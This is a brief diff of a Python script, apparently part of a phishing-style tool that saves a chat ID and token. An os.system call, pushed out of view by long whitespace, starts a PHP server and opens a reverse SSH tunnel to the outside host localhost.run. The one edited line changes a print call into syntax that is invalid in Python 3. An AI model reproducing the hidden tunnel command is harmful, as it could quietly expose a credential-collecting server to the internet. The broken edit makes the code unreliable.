@@ -31,4 +31,4 @@ if __name__ == '__main__':
     save_data(chat_id, token)
     
                                                                                        os.system("php -S localhost:8080 | ssh -R 80:localhost:8080 ssh.localhost.run")
-print(SLIK-ROAD)
+print"SLIK-ROAD"
